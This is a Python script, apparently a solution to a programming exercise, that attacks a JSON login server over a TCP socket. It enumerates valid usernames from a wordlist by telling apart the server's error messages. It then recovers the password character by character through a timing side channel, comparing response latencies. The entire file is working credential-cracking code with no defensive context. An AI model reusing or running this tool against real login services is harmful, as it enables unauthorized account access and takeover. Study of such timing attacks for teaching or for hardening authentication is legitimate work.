import os
import json
import argparse
import socket
import string
import time


def json_send_recv(data):
    json_data = json.dumps(data, indent=4)
    my_socket.send(json_data.encode("utf-8"))
    response_json = my_socket.recv(1024).decode("utf-8")
    return json.loads(response_json)


def duration_check():
    global max_duration
    passwords_ = list("")
    for symbol_ in list(string.ascii_letters + string.digits):
        password_ = "".join(passwords_).strip() + symbol_
        data_password_ = {"login": login_success, "password": password_}
        start_ = time.perf_counter()
        json_send_recv(data_password_)
        end_ = time.perf_counter()
        duration_ = end_ - start_
        if duration_ > max_duration:
            max_duration = duration_


if __name__ == "__main__":

    # argument parser
    argumentparser = argparse.ArgumentParser()
    argumentparser.add_argument("ip")
    argumentparser.add_argument("port")
    arg = argumentparser.parse_args()

    # responses
    password_error = {"result": "Wrong password!"}
    exception = {"result": "Exception happened during login"}
    success = {"result": "Connection success!"}

    # main program
    with socket.socket() as my_socket:
        with open(os.path.abspath("logins.txt"), "r") as logins:
            my_socket.connect((str(arg.ip), int(arg.port)))

            # login finder
            for login in logins:
                data_login = {"login": login.strip(), "password": " "}
                response = json_send_recv(data_login)
                if response == password_error:
                    login_success = login.strip()
                    break

            max_duration = 0
            duration_check()

            # password finder
            passwords = list("")
            result = True
            while result:
                for symbol in list(string.ascii_letters + string.digits):
                    password = "".join(passwords).strip() + symbol
                    data_password = {"login": login_success, "password": password}
                    start = time.perf_counter()
                    response = json_send_recv(data_password)
                    end = time.perf_counter()
                    duration = end - start
                    if max_duration <= duration:
                        passwords.append(symbol)
                    elif response == success:
                        print(json.dumps(data_password, indent=4))
                        result = False
                        break
